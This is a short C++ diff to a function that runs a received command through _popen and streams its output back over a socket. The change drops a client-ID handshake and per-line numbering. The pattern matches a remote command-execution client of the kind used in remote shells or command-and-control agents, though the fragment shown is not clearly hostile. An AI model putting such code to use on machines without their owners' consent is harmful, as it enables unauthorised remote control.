@@ -49,7 +49,6 @@ void output(FILE* stream, int _thread, const char* format, ...)
 }
 void getCmdOut(int t, std::string clientID, std::string cmd, int s, std::string b)
 {
-	int line = 0;
 	int recvBytes, rv;
 	std::string data;
 	std::string recvStr;
@@ -69,9 +68,6 @@ void getCmdOut(int t, std::string clientID, std::string cmd, int s, std::string 
 	
 	stream = _popen(cmd.c_str(), "r");
 
-	//Send id
-	send(s, clientID.c_str(), clientID.length() + 1, 0);
-
 	if (stream)
 	{
 		while (!feof(stream))
@@ -82,13 +78,11 @@ void getCmdOut(int t, std::string clientID, std::string cmd, int s, std::string 
 
 				if (data.find("\n") != std::string::npos)
 				{
-					data = clientID + "-" + std::to_string(line) + "-" + data;
 					send(s, data.c_str(), data.length() + 1, 0);
 
 					output(stdout, t, "\t%s", data.c_str());
 
 					data = "";
-					line++;
 
 					ZeroMemory(recvBuffer, bufsize);
 
